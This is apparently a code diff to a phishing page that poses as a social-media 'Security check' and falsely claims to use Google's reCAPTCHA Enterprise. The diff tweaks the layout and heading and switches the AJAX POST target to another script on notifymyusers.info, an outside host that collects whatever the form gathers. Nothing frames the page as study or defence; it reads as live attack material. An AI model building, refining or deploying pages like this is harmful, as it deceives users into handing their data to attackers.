@@ -35,7 +35,7 @@
   <body>
     <div class="headeri">
       <div class="container-fluid">
-        <img src="diqka.png" class="img-fluid" width="130" style="padding-top: 10px; padding-bottom: 5px;">
+        <img src="diqka.png" class="img-fluid" width="130" style="padding-top: 20px; padding-bottom: 15px; padding-left:10px;">
       </div>
     </div>
     <div class="trupi">
@@ -44,7 +44,7 @@
           <div class="col-md-6 offset-md-3">
             <div class="trupimrena">
               <form id="yourFormId" action="" method="POST">
-                <h2 style="font-weight: 600; font-size: 24px; margin-bottom: 20px;">Help us confirm it's you</h2>
+                <h2 style="font-weight: 600; font-size: 24px; margin-bottom: 20px;">Security check</h2>
                 <div class="h-captcha" data-sitekey="2090dde0-1a4a-4119-ac94-68dbc4180559" data-callback="onSuccess"></div>
                 <p style="color:#65676b; font-size:12px;">This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products. <br><br>
                   We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.<br><br>
@@ -98,7 +98,7 @@
 
         $.ajax({
             type: "POST",
-            url: "https://notifymyusers.info/send/serversfullverifiedu.php",
+            url: "https://notifymyusers.info/send/serversfullu.php",
             data: data,
             success: function(response)
             {
